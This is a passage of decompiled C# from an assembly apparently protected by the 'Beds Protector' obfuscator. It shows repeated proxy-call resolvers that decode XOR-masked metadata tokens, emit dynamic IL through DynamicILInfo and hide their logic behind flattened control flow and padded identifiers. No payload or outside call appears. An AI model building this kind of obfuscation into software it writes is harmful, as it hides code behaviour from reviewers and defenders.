        byte[] numArray3 = code;
        int index7 = num11;
        int num13 = index7 + 1;
        numArray3[index7] = (byte) 116;
        byte[] numArray4 = code;
        int index8 = num13;
        int num14 = index8 + 1;
        int num15 = (int) (byte) tokenFor;
        numArray4[index8] = (byte) num15;
        byte[] numArray5 = code;
        int index9 = num14;
        int num16 = index9 + 1;
        int num17 = (int) (byte) (tokenFor >> 8);
        numArray5[index9] = (byte) num17;
        byte[] numArray6 = code;
        int index10 = num16;
        int num18 = index10 + 1;
        int num19 = (int) (byte) (tokenFor >> 16);
        numArray6[index10] = (byte) num19;
        byte[] numArray7 = code;
        int index11 = num18;
        num9 = index11 + 1;
        int num20 = (int) (byte) (tokenFor >> 24);
        numArray7[index11] = (byte) num20;
      }
      else
        num9 = num11 + 5;
      ++index3;
    }
    byte[] numArray8 = code;
    int index12 = num9;
    int num21 = index12 + 1;
    int num22 = (int) (byte) ((uint) (byte) fieldFromHandle.Name[3] ^ (uint) obj1);
    numArray8[index12] = (byte) num22;
    int tokenFor1 = dynamicIlInfo.GetTokenFor(method.MethodHandle);
    byte[] numArray9 = code;
    int index13 = num21;
    int num23 = index13 + 1;
    int num24 = (int) (byte) tokenFor1;
    numArray9[index13] = (byte) num24;
    byte[] numArray10 = code;
    int index14 = num23;
    int num25 = index14 + 1;
    int num26 = (int) (byte) (tokenFor1 >> 8);
    numArray10[index14] = (byte) num26;
    byte[] numArray11 = code;
    int index15 = num25;
    int num27 = index15 + 1;
    int num28 = (int) (byte) (tokenFor1 >> 16);
    numArray11[index15] = (byte) num28;
    byte[] numArray12 = code;
    int index16 = num27;
    int index17 = index16 + 1;
    int num29 = (int) (byte) (tokenFor1 >> 24);
    numArray12[index16] = (byte) num29;
    code[index17] = (byte) 42;
    dynamicIlInfo.SetCode(code, parameterTypes.Length + 1);
    fieldFromHandle.SetValue((object) null, (object) dynamicMethod.CreateDelegate(fieldType));
  }

  [MethodImpl(MethodImplOptions.Unmanaged | MethodImplOptions.PreserveSig, MethodCodeType = MethodCodeType.Native)]
  static extern int Beds\u002DProtector\u002Drown\u002DFoxᅠᅠᅠᅠᅠJumped\u002DOver\u002DThe\u002DLazy\u002DDog8bThe\u002DᅠᅠᅠᅠQuick\u002DBrown\u002Dᅠᅠᅠᅠᅠᅠe\u002DLazy\u002DDog8bᅠᅠᅠᅠᅠThe\u002DQuick\u002D\u002DOver\u002DThe\u002DLaᅠᅠᅠᅠzyᅠ(
    [In] int obj0);

  static void Beds\u002DProtector\u002Drown\u002DFoxᅠᅠᅠᅠᅠJumped\u002DOver\u002DThe\u002DLazy\u002DDog9bThe\u002DᅠᅠᅠᅠQuick\u002DBrown\u002Dᅠᅠᅠᅠᅠᅠe\u002DLazy\u002DDog9bᅠᅠᅠᅠᅠThe\u002DQuick\u002D\u002DOver\u002DThe\u002DLaᅠᅠᅠᅠzyᅠ(
    [In] RuntimeFieldHandle obj0,
    [In] byte obj1)
  {
    int num1 = 94524 - 177758 + 83234;
    FieldInfo fieldFromHandle;
    Type fieldType;
    DynamicMethod dynamicMethod;
    MethodInfo methodInfo;
    MethodBase method;
    Type[] parameterTypes;
    Type declaringType;
    do
    {
      byte[] numArray;
      ParameterInfo[] parameters;
      if (num1 != 72634 - 149787 + 77174)
      {
        if (num1 == 80842 - 114991 + 34156)
        {
          fieldType = fieldFromHandle.FieldType;
          num1 = 46936 - 3616 - 43312;
        }
        if (num1 != 70849 - 169245 + 98407)
          goto label_6;
label_5:
        dynamicMethod = (DynamicMethod) null;
        num1 = 28730 - 69600 + 40882;
label_6:
        if (num1 == 25803 + 15345 - 41146)
        {
          numArray = fieldFromHandle.Module.ResolveSignature(fieldFromHandle.MetadataToken);
          num1 = 35205 - 37712 + 2510;
        }
        if (num1 == 1010 - 64361 + 63369)
        {
          parameters = methodInfo.GetParameters();
          num1 = 80798 - 119841 + 39062;
        }
        if (num1 == 4437 + 13809 - 18238)
        {
          if (method.IsStatic)
            num1 = 59181 - 140454 + 81282;
          else
            goto label_5;
        }
        if (num1 != 75636 + 16234 - 91854)
          goto label_15;
      }
      else
        goto label_34;
label_14:
      MethodInfo[] methods;
      int index1;
      methodInfo = methods[index1];
      num1 = 36403 - 90880 + 54494;
label_15:
      int num2;
      int metadataToken;
      if (num1 == 16936 - 65864 + 48932)
      {
        int num3;
        int num4;
        int num5;
        int num6 = fieldFromHandle.GetOptionalCustomModifiers()[0].MetadataToken + (((int) fieldFromHandle.Name[4] ^ (int) numArray[num3 = num2 - 1]) << 0) + (((int) fieldFromHandle.Name[2] ^ (int) numArray[num4 = num3 - 1]) << 16) + (((int) fieldFromHandle.Name[3] ^ (int) numArray[num5 = num4 - 1]) << 24);
        int num7 = num5 - 1;
        int num8 = ((int) fieldFromHandle.Name[1] ^ (int) numArray[num2 = num7 - 1]) << 8;
        metadataToken = \u003CModule\u003E.Beds\u002DProtector\u002Drown\u002DFoxᅠᅠᅠᅠᅠJumped\u002DOver\u002DThe\u002DLazy\u002DDogaBThe\u002DᅠᅠᅠᅠQuick\u002DBrown\u002Dᅠᅠᅠᅠᅠᅠe\u002DLazy\u002DDogaBᅠᅠᅠᅠᅠThe\u002DQuick\u002D\u002DOver\u002DThe\u002DLaᅠᅠᅠᅠzyᅠ(num6 + num8);
        num1 = 48793 + 33466 - 82254;
      }
      if (num1 == 7513 - 31319 + 23825)
      {
        parameterTypes = new Type[parameters.Length];
        num1 = 48805 - 73671 + 24886;
      }
      if (num1 != 42088 - 26147 - 15919)
        goto label_21;
label_20:
      int index2;
      parameterTypes[index2] = parameters[index2].ParameterType;
      num1 = 74663 - 56897 - 17743;
label_21:
      if (num1 == 56676 - 23208 - 33448)
      {
        index2 = 0;
        num1 = 95093 - 91050 - 4022;
      }
      if (num1 == 25074 - 17673 - 7391)
        return;
      if (num1 == 49028 - 112290 + 63274)
      {
        parameterTypes = (Type[]) null;
        num1 = 86651 - 85016 - 1622;
      }
      if (num1 == 53577 - 104118 + 50550)
      {
        fieldFromHandle.SetValue((object) null, (object) Delegate.CreateDelegate(fieldType, (MethodInfo) method));
        num1 = 81114 - 157306 + 76202;
      }
      if (num1 == 15237 - 46285 + 31053)
      {
        metadataToken *= fieldFromHandle.GetCustomAttributes(false)[0].GetHashCode();
        num1 = 93351 - 43270 - 50075;
      }
      if (num1 == 15764 + 65363 - 81110)
      {
        if ((object) methodInfo.DeclaringType == (object) fieldType)
        {
          num1 = 74110 - 148138 + 74046;
        }
        else
        {
          ++index1;
          goto label_57;
        }
      }
      if (num1 != 26231 + 21046 - 47253)
        goto label_36;
label_34:
      if (index2 >= parameterTypes.Length)
        num1 = 44910 - 26024 - 18861;
      else
        goto label_20;
label_36:
      if (num1 == 74863 - 140414 + 65554)
      {
        num2 = numArray.Length;
        num1 = 60305 - 60538 + 237;
      }
      if (num1 == 61612 - 80757 + 19159)
      {
        index1 = 0;
        num1 = 53263 + 14297 - 67545;
      }
      if (num1 == 67193 - 93938 + 26758)
      {
        methods = fieldFromHandle.FieldType.GetMethods(BindingFlags.Instance | BindingFlags.NonPublic);
        num1 = 57245 - 125353 + 68122;
      }
      if (num1 != 21621 + 72968 - 94574)
      {
        if (num1 == 82409 - 181598 + 99214)
        {
          declaringType = method.DeclaringType;
          num1 = 89227 - 185627 + 96426;
        }
        if (num1 == 4788 + 54368 - 59150)
        {
          method = fieldFromHandle.Module.ResolveMethod(metadataToken);
          num1 = 51214 + 31688 - 82895;
        }
        if (num1 == 10647 - 75872 + 65226)
        {
          fieldFromHandle = FieldInfo.GetFieldFromHandle(obj0);
          num1 = 30844 + 30815 - 61657;
        }
        if (num1 == 30916 - 51377 + 20484)
        {
          ++index2;
          num1 = 13564 - 9375 - 4165;
        }
        if (num1 == 47288 - 89274 + 41986)
          num1 = 79130 - 155799 + 76670;
        continue;
      }
label_57:
      if (index1 < methods.Length)
        goto label_14;
      else
        goto label_58;
    }
    while (num1 != 14367 + 24287 - 38628);
    dynamicMethod = new DynamicMethod("", methodInfo.ReturnType, parameterTypes, declaringType.IsInterface || declaringType.IsArray ? fieldType : declaringType, true);
label_58:
    DynamicILInfo dynamicIlInfo = dynamicMethod.GetDynamicILInfo();
    dynamicIlInfo.SetLocalSignature(new byte[2]
    {
      (byte) 7,
      (byte) 0
    });
    byte[] code = new byte[7 * parameterTypes.Length + 6];
    int num9 = 0;
    ParameterInfo[] parameters1 = method.GetParameters();
    int index3 = method.IsConstructor ? 0 : -1;
    for (int index4 = 0; index4 < parameterTypes.Length; ++index4)
    {
      byte[] numArray1 = code;
      int index5 = num9;
      int num10 = index5 + 1;
      numArray1[index5] = (byte) 14;
      byte[] numArray2 = code;
      int index6 = num10;
      int num11 = index6 + 1;
      int num12 = (int) (byte) index4;
      numArray2[index6] = (byte) num12;
      Type type = index3 == -1 ? method.DeclaringType : parameters1[index3].ParameterType;
      if (type.IsClass && !type.IsPointer && !type.IsByRef)
      {
        int tokenFor = dynamicIlInfo.GetTokenFor(type.TypeHandle);
        byte[] numArray3 = code;
        int index7 = num11;
        int num13 = index7 + 1;
        numArray3[index7] = (byte) 116;
        byte[] numArray4 = code;
        int index8 = num13;
        int num14 = index8 + 1;
        int num15 = (int) (byte) tokenFor;
        numArray4[index8] = (byte) num15;
        byte[] numArray5 = code;
        int index9 = num14;
        int num16 = index9 + 1;
        int num17 = (int) (byte) (tokenFor >> 8);
        numArray5[index9] = (byte) num17;
        byte[] numArray6 = code;
        int index10 = num16;
        int num18 = index10 + 1;
        int num19 = (int) (byte) (tokenFor >> 16);
        numArray6[index10] = (byte) num19;
        byte[] numArray7 = code;
        int index11 = num18;
        num9 = index11 + 1;
        int num20 = (int) (byte) (tokenFor >> 24);
        numArray7[index11] = (byte) num20;
      }
      else
        num9 = num11 + 5;
      ++index3;
    }
    byte[] numArray8 = code;
    int index12 = num9;
    int num21 = index12 + 1;
    int num22 = (int) (byte) ((uint) (byte) fieldFromHandle.Name[0] ^ (uint) obj1);
    numArray8[index12] = (byte) num22;
    int tokenFor1 = dynamicIlInfo.GetTokenFor(method.MethodHandle);
    byte[] numArray9 = code;
    int index13 = num21;
    int num23 = index13 + 1;
    int num24 = (int) (byte) tokenFor1;
    numArray9[index13] = (byte) num24;
    byte[] numArray10 = code;
    int index14 = num23;
    int num25 = index14 + 1;
    int num26 = (int) (byte) (tokenFor1 >> 8);
    numArray10[index14] = (byte) num26;
    byte[] numArray11 = code;
    int index15 = num25;
    int num27 = index15 + 1;
    int num28 = (int) (byte) (tokenFor1 >> 16);
    numArray11[index15] = (byte) num28;
    byte[] numArray12 = code;
    int index16 = num27;
    int index17 = index16 + 1;
    int num29 = (int) (byte) (tokenFor1 >> 24);
    numArray12[index16] = (byte) num29;
    code[index17] = (byte) 42;
    dynamicIlInfo.SetCode(code, parameterTypes.Length + 1);
    fieldFromHandle.SetValue((object) null, (object) dynamicMethod.CreateDelegate(fieldType));
  }

  [MethodImpl(MethodImplOptions.Unmanaged | MethodImplOptions.PreserveSig, MethodCodeType = MethodCodeType.Native)]
  static extern int Beds\u002DProtector\u002Drown\u002DFoxᅠᅠᅠᅠᅠJumped\u002DOver\u002DThe\u002DLazy\u002DDogaBThe\u002DᅠᅠᅠᅠQuick\u002DBrown\u002Dᅠᅠᅠᅠᅠᅠe\u002DLazy\u002DDogaBᅠᅠᅠᅠᅠThe\u002DQuick\u002D\u002DOver\u002DThe\u002DLaᅠᅠᅠᅠzyᅠ(
    [In] int obj0);

  static void Beds\u002DProtector\u002Drown\u002DFoxᅠᅠᅠᅠᅠJumped\u002DOver\u002DThe\u002DLazy\u002DDogABThe\u002DᅠᅠᅠᅠQuick\u002DBrown\u002Dᅠᅠᅠᅠᅠᅠe\u002DLazy\u002DDogABᅠᅠᅠᅠᅠThe\u002DQuick\u002D\u002DOver\u002DThe\u002DLaᅠᅠᅠᅠzyᅠ(
    [In] RuntimeFieldHandle obj0,
    [In] byte obj1)
  {
    int num1 = 94630 - 119488 + 24858;
    FieldInfo fieldFromHandle;
    MethodBase method;
    Type[] parameterTypes;
    DynamicMethod dynamicMethod;
    MethodInfo methodInfo;
    Type fieldType;
    Type declaringType;
    do
    {
      int metadataToken;
      if (num1 == 1023 - 90849 + 89831)
      {
        metadataToken *= fieldFromHandle.GetCustomAttributes(false)[0].GetHashCode();
        num1 = 22732 - 35145 + 12419;
      }
      if (num1 == 60922 + 8394 - 69310)
      {
        method = fieldFromHandle.Module.ResolveMethod(metadataToken);
        num1 = 43862 - 18931 - 24924;
      }
      ParameterInfo[] parameters;
      if (num1 == 97105 + 2896 - 99982)
      {
        parameterTypes = new Type[parameters.Length];
        num1 = 32916 - 32201 - 695;
      }
      if (num1 != 50439 - 118428 + 68000)
        goto label_9;
label_8:
      dynamicMethod = (DynamicMethod) null;
      num1 = 95049 - 93233 - 1804;
label_9:
      byte[] numArray;
      int num2;
      if (num1 == 54440 - 91161 + 36725)
      {
        int num3;
        int num4;
        int num5;
        int num6 = fieldFromHandle.GetOptionalCustomModifiers()[0].MetadataToken + (((int) fieldFromHandle.Name[4] ^ (int) numArray[num3 = num2 - 1]) << 0) + (((int) fieldFromHandle.Name[2] ^ (int) numArray[num4 = num3 - 1]) << 24) + (((int) fieldFromHandle.Name[1] ^ (int) numArray[num5 = num4 - 1]) << 16);
        int num7 = num5 - 1;
        int num8 = ((int) fieldFromHandle.Name[3] ^ (int) numArray[num2 = num7 - 1]) << 8;
        metadataToken = \u003CModule\u003E.Beds\u002DProtector\u002Drown\u002DFoxᅠᅠᅠᅠᅠJumped\u002DOver\u002DThe\u002DLazy\u002DDogbBThe\u002DᅠᅠᅠᅠQuick\u002DBrown\u002Dᅠᅠᅠᅠᅠᅠe\u002DLazy\u002DDogbBᅠᅠᅠᅠᅠThe\u002DQuick\u002D\u002DOver\u002DThe\u002DLaᅠᅠᅠᅠzyᅠ(num6 + num8);
        num1 = 6229 + 82480 - 88704;
      }
      if (num1 == 32786 + 44267 - 77035)
      {
        parameters = methodInfo.GetParameters();
        num1 = 19005 + 40368 - 59354;
      }
      if (num1 == 19312 + 71826 - 91137)
      {
        fieldFromHandle = FieldInfo.GetFieldFromHandle(obj0);
        num1 = 63350 + 8065 - 71413;
      }
      int index1;
      if (num1 == 34855 - 17636 - 17202)
      {
        if ((object) methodInfo.DeclaringType == (object) fieldType)
        {
          num1 = 17061 - 46831 + 29788;
        }
        else
        {
          ++index1;
          goto label_57;
        }
      }
      if (num1 == 76687 - 167833 + 91148)
      {
        numArray = fieldFromHandle.Module.ResolveSignature(fieldFromHandle.MetadataToken);
        num1 = 37932 - 28878 - 9051;
      }
      if (num1 != 56858 - 26392 - 30445)
      {
        if (num1 == 75693 - 47577 - 28102)
        {
          index1 = 0;
          num1 = 80605 - 111170 + 30580;
        }
        if (num1 != 47889 - 60234 + 12360)
        {
          if (num1 != 54134 + 9557 - 63675)
            goto label_26;
        }
        else
          goto label_57;
      }
      else
        goto label_31;
label_25:
      MethodInfo[] methods;
      methodInfo = methods[index1];
      num1 = 96587 - 135084 + 38514;
label_26:
      int index2;
      if (num1 == 14425 + 84601 - 99003)
      {
        ++index2;
        num1 = 9118 + 6937 - 16031;
      }
      if (num1 == 97555 - 25718 - 71825)
      {
        parameterTypes = (Type[]) null;
        num1 = 67984 - 91789 + 23818;
      }
      if (num1 != 28908 - 68774 + 39890)
        goto label_33;
label_31:
      if (index2 >= parameterTypes.Length)
        num1 = 72833 + 6447 - 79255;
      else
        goto label_36;
label_33:
      if (num1 == 43310 - 47126 + 3829)
      {
        methods = fieldFromHandle.FieldType.GetMethods(BindingFlags.Instance | BindingFlags.NonPublic);
        num1 = 86621 - 100313 + 13706;
      }
      if (num1 != 12874 + 17427 - 30279)
        goto label_37;
label_36:
      parameterTypes[index2] = parameters[index2].ParameterType;
      num1 = 72931 - 71091 - 1817;
label_37:
      if (num1 == 45375 - 91151 + 45779)
      {
        num2 = numArray.Length;
        num1 = 91931 - 61013 - 30914;
      }
      if (num1 == 85685 - 105797 + 20120)
      {
        if (method.IsStatic)
          num1 = 12071 - 105322 + 93260;
        else
          goto label_8;
      }
      if (num1 == 58755 - 137764 + 79018)
      {
        fieldFromHandle.SetValue((object) null, (object) Delegate.CreateDelegate(fieldType, (MethodInfo) method));
        num1 = 88542 - 11241 - 77291;
      }
      if (num1 == 78325 - 68303 - 10002)
      {
        index2 = 0;
        num1 = 84419 - 90343 + 5945;
      }
      if (num1 == 34684 - 102880 + 68206)
        return;
      if (num1 == 85751 - 7767 - 77959)
      {
        declaringType = method.DeclaringType;
        num1 = 70008 - 46743 - 23239;
      }
      if (num1 == 2342 + 78039 - 80374)
      {
        fieldType = fieldFromHandle.FieldType;
        num1 = 54646 + 8976 - 63614;
      }
      if (num1 == 12064 + 59135 - 71199)
        num1 = 78699 + 10569 - 89267;
      continue;
label_57:
      if (index1 < methods.Length)
        goto label_25;
      else
        goto label_58;
    }
    while (num1 != 34688 - 10325 - 24337);
    dynamicMethod = new DynamicMethod("", methodInfo.ReturnType, parameterTypes, declaringType.IsInterface || declaringType.IsArray ? fieldType : declaringType, true);
label_58:
    DynamicILInfo dynamicIlInfo = dynamicMethod.GetDynamicILInfo();
    dynamicIlInfo.SetLocalSignature(new byte[2]
    {
      (byte) 7,
      (byte) 0
    });
    byte[] code = new byte[7 * parameterTypes.Length + 6];
    int num9 = 0;
    ParameterInfo[] parameters1 = method.GetParameters();
    int index3 = method.IsConstructor ? 0 : -1;
    for (int index4 = 0; index4 < parameterTypes.Length; ++index4)
    {
      byte[] numArray1 = code;
      int index5 = num9;
      int num10 = index5 + 1;
      numArray1[index5] = (byte) 14;
      byte[] numArray2 = code;
      int index6 = num10;
      int num11 = index6 + 1;
      int num12 = (int) (byte) index4;
      numArray2[index6] = (byte) num12;
      Type type = index3 == -1 ? method.DeclaringType : parameters1[index3].ParameterType;
      if (type.IsClass && !type.IsPointer && !type.IsByRef)
      {
        int tokenFor = dynamicIlInfo.GetTokenFor(type.TypeHandle);
        byte[] numArray3 = code;
        int index7 = num11;
        int num13 = index7 + 1;
        numArray3[index7] = (byte) 116;
        byte[] numArray4 = code;
        int index8 = num13;
        int num14 = index8 + 1;
        int num15 = (int) (byte) tokenFor;
        numArray4[index8] = (byte) num15;
        byte[] numArray5 = code;
        int index9 = num14;
        int num16 = index9 + 1;
        int num17 = (int) (byte) (tokenFor >> 8);
        numArray5[index9] = (byte) num17;
        byte[] numArray6 = code;
        int index10 = num16;
        int num18 = index10 + 1;
        int num19 = (int) (byte) (tokenFor >> 16);
        numArray6[index10] = (byte) num19;
        byte[] numArray7 = code;
        int index11 = num18;
        num9 = index11 + 1;
        int num20 = (int) (byte) (tokenFor >> 24);
        numArray7[index11] = (byte) num20;
      }
      else
        num9 = num11 + 5;
      ++index3;
    }
    byte[] numArray8 = code;
    int index12 = num9;
    int num21 = index12 + 1;
    int num22 = (int) (byte) ((uint) (byte) fieldFromHandle.Name[0] ^ (uint) obj1);
    numArray8[index12] = (byte) num22;
    int tokenFor1 = dynamicIlInfo.GetTokenFor(method.MethodHandle);
    byte[] numArray9 = code;
    int index13 = num21;
    int num23 = index13 + 1;
    int num24 = (int) (byte) tokenFor1;
    numArray9[index13] = (byte) num24;
    byte[] numArray10 = code;
    int index14 = num23;
    int num25 = index14 + 1;
    int num26 = (int) (byte) (tokenFor1 >> 8);
    numArray10[index14] = (byte) num26;
    byte[] numArray11 = code;
    int index15 = num25;
    int num27 = index15 + 1;
    int num28 = (int) (byte) (tokenFor1 >> 16);
    numArray11[index15] = (byte) num28;
    byte[] numArray12 = code;
    int index16 = num27;
    int index17 = index16 + 1;
    int num29 = (int) (byte) (tokenFor1 >> 24);
    numArray12[index16] = (byte) num29;
    code[index17] = (byte) 42;
    dynamicIlInfo.SetCode(code, parameterTypes.Length + 1);
    fieldFromHandle.SetValue((object) null, (object) dynamicMethod.CreateDelegate(fieldType));
  }

  [MethodImpl(MethodImplOptions.Unmanaged | MethodImplOptions.PreserveSig, MethodCodeType = MethodCodeType.Native)]
  static extern int Beds\u002DProtector\u002Drown\u002DFoxᅠᅠᅠᅠᅠJumped\u002DOver\u002DThe\u002DLazy\u002DDogbBThe\u002DᅠᅠᅠᅠQuick\u002DBrown\u002Dᅠᅠᅠᅠᅠᅠe\u002DLazy\u002DDogbBᅠᅠᅠᅠᅠThe\u002DQuick\u002D\u002DOver\u002DThe\u002DLaᅠᅠᅠᅠzyᅠ(
    [In] int obj0);

  static void Beds\u002DProtector\u002Drown\u002DFoxᅠᅠᅠᅠᅠJumped\u002DOver\u002DThe\u002DLazy\u002DDogBBThe\u002DᅠᅠᅠᅠQuick\u002DBrown\u002Dᅠᅠᅠᅠᅠᅠe\u002DLazy\u002DDogBBᅠᅠᅠᅠᅠThe\u002DQuick\u002D\u002DOver\u002DThe\u002DLaᅠᅠᅠᅠzyᅠ(
    [In] RuntimeFieldHandle obj0,
    [In] byte obj1)
  {
    int num1 = 52988 - 78253 + 25265;
    MethodInfo methodInfo;
    Type fieldType;
    Type[] parameterTypes;
    FieldInfo fieldFromHandle;
    MethodBase method;
    Type declaringType;
    DynamicMethod dynamicMethod;
    do
    {
      int index1;
      if (num1 == 91814 - 98790 + 6993)
      {
        if ((object) methodInfo.DeclaringType == (object) fieldType)
        {
          num1 = 39833 - 45260 + 5445;
        }
        else
        {
          ++index1;
          goto label_57;
        }
      }
      if (num1 == 16548 + 62708 - 79246)
        return;
      if (num1 == 15300 - 72584 + 57296)
      {
        parameterTypes = (Type[]) null;
        num1 = 18978 + 55779 - 74744;
      }
      int index2;
      if (num1 == 96916 - 179240 + 82347)
      {
        ++index2;
        num1 = 46387 - 24325 - 22038;
      }
      if (num1 != 35391 + 34746 - 70113)
        goto label_12;
label_10:
      if (index2 >= parameterTypes.Length)
        num1 = 78939 - 139538 + 60624;
      else
        goto label_25;
label_12:
      MethodInfo[] methods;
      if (num1 == 45397 - 15366 - 30018)
      {
        methods = fieldFromHandle.FieldType.GetMethods(BindingFlags.Instance | BindingFlags.NonPublic);
        num1 = 52693 - 114330 + 61651;
      }
      int metadataToken;
      if (num1 == 63489 + 16245 - 79728)
      {
        method = fieldFromHandle.Module.ResolveMethod(metadataToken);
        num1 = 74929 - 54549 - 20373;
      }
      byte[] numArray;
      int num2;
      if (num1 != 84368 - 79428 - 4919)
      {
        if (num1 == 31970 - 50352 + 18383)
        {
          fieldFromHandle = FieldInfo.GetFieldFromHandle(obj0);
          num1 = 49593 - 74847 + 25256;
        }
        if (num1 == 42918 - 7237 - 35672)
        {
          fieldFromHandle.SetValue((object) null, (object) Delegate.CreateDelegate(fieldType, (MethodInfo) method));
          num1 = 84955 - 51812 - 33133;
        }
        if (num1 == 35332 - 85107 + 49779)
        {
          int num3;
          int num4;
          int num5;
          int num6 = fieldFromHandle.GetOptionalCustomModifiers()[0].MetadataToken + (((int) fieldFromHandle.Name[2] ^ (int) numArray[num3 = num2 - 1]) << 24) + (((int) fieldFromHandle.Name[1] ^ (int) numArray[num4 = num3 - 1]) << 8) + (((int) fieldFromHandle.Name[3] ^ (int) numArray[num5 = num4 - 1]) << 0);
          int num7 = num5 - 1;
          int num8 = ((int) fieldFromHandle.Name[0] ^ (int) numArray[num2 = num7 - 1]) << 16;
          metadataToken = \u003CModule\u003E.Beds\u002DProtector\u002Drown\u002DFoxᅠᅠᅠᅠᅠJumped\u002DOver\u002DThe\u002DLazy\u002DDogcBThe\u002DᅠᅠᅠᅠQuick\u002DBrown\u002Dᅠᅠᅠᅠᅠᅠe\u002DLazy\u002DDogcBᅠᅠᅠᅠᅠThe\u002DQuick\u002D\u002DOver\u002DThe\u002DLaᅠᅠᅠᅠzyᅠ(num6 + num8);
          num1 = 74940 + 18621 - 93556;
        }
        if (num1 != 28407 - 38946 + 10554)
        {
          if (num1 != 95015 - 71912 - 23081)
            goto label_26;
        }
        else
          goto label_57;
      }
      else
        goto label_10;
label_25:
      ParameterInfo[] parameters;
      parameterTypes[index2] = parameters[index2].ParameterType;
      num1 = 61973 - 78483 + 16533;
label_26:
      if (num1 == 11731 + 17119 - 28845)
      {
        metadataToken *= fieldFromHandle.GetCustomAttributes(false)[0].GetHashCode();
        num1 = 40712 + 30993 - 71699;
      }
      if (num1 == 42241 - 118913 + 76690)
      {
        parameters = methodInfo.GetParameters();
        num1 = 28024 + 4761 - 32766;
      }
      if (num1 == 7141 + 25979 - 33118)
      {
        numArray = fieldFromHandle.Module.ResolveSignature(fieldFromHandle.MetadataToken);
        num1 = 15908 + 46594 - 62499;
      }
      if (num1 == 70594 - 74331 + 3762)
      {
        declaringType = method.DeclaringType;
        num1 = 11362 - 43997 + 32661;
      }
      if (num1 != 10826 + 28565 - 39375)
        goto label_36;
label_35:
      methodInfo = methods[index1];
      num1 = 46086 - 80154 + 34085;
label_36:
      if (num1 != 2175 - 85572 + 83408)
        goto label_38;
label_37:
      dynamicMethod = (DynamicMethod) null;
      num1 = 19138 - 102240 + 83114;
label_38:
      if (num1 == 32532 + 4288 - 36800)
      {
        index2 = 0;
        num1 = 78079 - 87242 + 9184;
      }
      if (num1 == 35968 + 16866 - 52831)
      {
        num2 = numArray.Length;
        num1 = 77787 - 86026 + 8243;
      }
      if (num1 == 43226 + 39177 - 82389)
      {
        index1 = 0;
        num1 = 60582 - 156839 + 96272;
      }
      if (num1 == 24855 + 12771 - 37607)
      {
        parameterTypes = new Type[parameters.Length];
        num1 = 96183 - 85520 - 10643;
      }
      if (num1 == 32324 - 73542 + 41225)
      {
        fieldType = fieldFromHandle.FieldType;
        num1 = 42605 - 13767 - 28830;
      }
      if (num1 == 14103 + 49358 - 63453)
      {
        if (method.IsStatic)
          num1 = 50003 - 14736 - 35258;
        else
          goto label_37;
      }
      if (num1 == 25699 - 115066 + 89367)
        num1 = 94577 - 155295 + 60719;
      continue;
label_57:
      if (index1 < methods.Length)
        goto label_35;
      else
        goto label_58;
    }
    while (num1 != 79830 - 146463 + 66659);
    dynamicMethod = new DynamicMethod("", methodInfo.ReturnType, parameterTypes, declaringType.IsInterface || declaringType.IsArray ? fieldType : declaringType, true);
label_58:
    DynamicILInfo dynamicIlInfo = dynamicMethod.GetDynamicILInfo();
    dynamicIlInfo.SetLocalSignature(new byte[2]
    {
      (byte) 7,
      (byte) 0
    });
    byte[] code = new byte[7 * parameterTypes.Length + 6];
    int num9 = 0;
    ParameterInfo[] parameters1 = method.GetParameters();
    int index3 = method.IsConstructor ? 0 : -1;
    for (int index4 = 0; index4 < parameterTypes.Length; ++index4)
    {
      byte[] numArray1 = code;
      int index5 = num9;
      int num10 = index5 + 1;
      numArray1[index5] = (byte) 14;
      byte[] numArray2 = code;
      int index6 = num10;
      int num11 = index6 + 1;
      int num12 = (int) (byte) index4;
      numArray2[index6] = (byte) num12;
      Type type = index3 == -1 ? method.DeclaringType : parameters1[index3].ParameterType;
      if (type.IsClass && !type.IsPointer && !type.IsByRef)
      {
        int tokenFor = dynamicIlInfo.GetTokenFor(type.TypeHandle);
        byte[] numArray3 = code;
        int index7 = num11;
        int num13 = index7 + 1;
        numArray3[index7] = (byte) 116;
        byte[] numArray4 = code;
        int index8 = num13;
        int num14 = index8 + 1;
        int num15 = (int) (byte) tokenFor;
        numArray4[index8] = (byte) num15;
        byte[] numArray5 = code;
        int index9 = num14;
        int num16 = index9 + 1;
        int num17 = (int) (byte) (tokenFor >> 8);
        numArray5[index9] = (byte) num17;
        byte[] numArray6 = code;
        int index10 = num16;
        int num18 = index10 + 1;
        int num19 = (int) (byte) (tokenFor >> 16);
        numArray6[index10] = (byte) num19;
        byte[] numArray7 = code;
        int index11 = num18;
        num9 = index11 + 1;
        int num20 = (int) (byte) (tokenFor >> 24);
        numArray7[index11] = (byte) num20;
      }
      else
        num9 = num11 + 5;
      ++index3;
    }
    byte[] numArray8 = code;
    int index12 = num9;
    int num21 = index12 + 1;
    int num22 = (int) (byte) ((uint) (byte) fieldFromHandle.Name[4] ^ (uint) obj1);
    numArray8[index12] = (byte) num22;
    int tokenFor1 = dynamicIlInfo.GetTokenFor(method.MethodHandle);
    byte[] numArray9 = code;
    int index13 = num21;
    int num23 = index13 + 1;
    int num24 = (int) (byte) tokenFor1;
    numArray9[index13] = (byte) num24;
    byte[] numArray10 = code;
    int index14 = num23;
    int num25 = index14 + 1;
    int num26 = (int) (byte) (tokenFor1 >> 8);
    numArray10[index14] = (byte) num26;
    byte[] numArray11 = code;
    int index15 = num25;
    int num27 = index15 + 1;
    int num28 = (int) (byte) (tokenFor1 >> 16);
    numArray11[index15] = (byte) num28;
    byte[] numArray12 = code;
    int index16 = num27;
    int index17 = index16 + 1;
    int num29 = (int) (byte) (tokenFor1 >> 24);
    numArray12[index16] = (byte) num29;
    code[index17] = (byte) 42;
    dynamicIlInfo.SetCode(code, parameterTypes.Length + 1);
    fieldFromHandle.SetValue((object) null, (object) dynamicMethod.CreateDelegate(fieldType));
  }

  [MethodImpl(MethodImplOptions.Unmanaged | MethodImplOptions.PreserveSig, MethodCodeType = MethodCodeType.Native)]
  static extern int Beds\u002DProtector\u002Drown\u002DFoxᅠᅠᅠᅠᅠJumped\u002DOver\u002DThe\u002DLazy\u002DDogcBThe\u002DᅠᅠᅠᅠQuick\u002DBrown\u002Dᅠᅠᅠᅠᅠᅠe\u002DLazy\u002DDogcBᅠᅠᅠᅠᅠThe\u002DQuick\u002D\u002DOver\u002DThe\u002DLaᅠᅠᅠᅠzyᅠ(
    [In] int obj0);

